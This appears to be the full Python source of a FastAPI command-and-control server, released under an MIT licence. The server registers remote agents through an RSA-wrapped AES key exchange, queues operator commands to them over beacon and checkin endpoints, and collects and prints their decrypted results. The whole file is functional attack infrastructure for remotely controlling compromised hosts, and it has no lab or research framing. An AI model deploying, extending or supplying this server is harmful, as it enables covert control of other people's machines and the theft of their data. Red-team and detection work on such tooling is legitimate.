######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel
from typing import Dict
import logging
import base64
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
import uvicorn

app = FastAPI()
agents: Dict[str, Dict] = {}

# Configuring logging
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

class KeyExchangeRequest(BaseModel):
    AgentID: str
    EncAESKey: str

class BeaconRequest(BaseModel):
    AgentID: str

# Load RSA Public Key in XML Format
try:
    with open("public_key.xml", "r") as xml_file:
        PUBLIC_KEY_XML = xml_file.read()
except FileNotFoundError:
    logging.error("public_key.xml not found!")
    PUBLIC_KEY_XML = ""

@app.get("/public_key")
def get_public_key():
    """Send public key in XML format to agents."""
    if not PUBLIC_KEY_XML:
        raise HTTPException(status_code=500, detail="Public key not found")
    
    logging.info("Public key requested")
    return {"PublicKey": PUBLIC_KEY_XML}

def check_key_length(key: bytes) -> bytes:
    if len(key) not in [16, 24, 32]:
        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
    return key

def encrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    encrypted_data = base64.b64encode(iv + ct_bytes).decode('utf-8')
    return encrypted_data

def decrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    try:
        raw_data = base64.b64decode(data)
        iv, ct = raw_data[:16], raw_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

def load_private_key():
    with open("private_key.pem", "rb") as f:
        private_key = RSA.import_key(f.read())
    return private_key

def decrypt_aes_key(enc_aes_key_base64, private_key):
    enc_aes_key = base64.b64decode(enc_aes_key_base64)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(enc_aes_key)
    return aes_key

private_key = load_private_key()

@app.post("/exchange_key")
def exchange_key(request: KeyExchangeRequest):
    """Handle the key exchange request from agents."""
    agent_id = request.AgentID
    enc_aes_key = request.EncAESKey
    try:
        aes_key = decrypt_aes_key(enc_aes_key, private_key)
        agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
        logging.info(f"Key exchange successful for AgentID: {agent_id}")
        return {"Status": "Success"}
    except Exception as e:
        logging.error(f"Key exchange failed for AgentID {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Key exchange failed")

@app.post("/beacon")
def beacon(request: BeaconRequest):
    """Handle beacon from agents to keep the connection alive."""
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    aes_key = agents[agent_id]["aes_key"]
    # Check for pending commands
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, aes_key)
        logging.info(f"Sent command '{command}' to agent {agent_id}")
    else:
        response = encrypt_data("NoCommand", aes_key)
        logging.info(f"No commands for agent {agent_id}")
    
    return {"data": response}

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    aes_key = agents[agent_id]["aes_key"]
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, aes_key)
    else:
        response = encrypt_data("NoCommand", aes_key)

    return {"data": response}

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    try:
        decrypted_result = decrypt_data(request.Result, agents[agent_id]["aes_key"])
        # Append the result to the agent's result list
        agents[agent_id]["results"].append(decrypted_result)
        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
        logging.info(message)
        print(message, flush=True)  # Print to console for real-time monitoring
    except Exception as e:
        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

    return {"Status": "OK"}

@app.get("/list_agents")
def list_agents():
    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

@app.get("/result")
def get_result(agent_id: str = Query(..., alias="agent_id")):
    """Get the result of the last command executed by the agent."""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    if agents[agent_id]["results"]:
        result = agents[agent_id]["results"].pop(0)
        logging.info(f"Fetched result for agent {agent_id}: {result}")
        return {"Result": result}
    else:
        logging.info(f"No results available for agent {agent_id}")
        return {"Result": "No result available"}

def run_server():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    run_server()
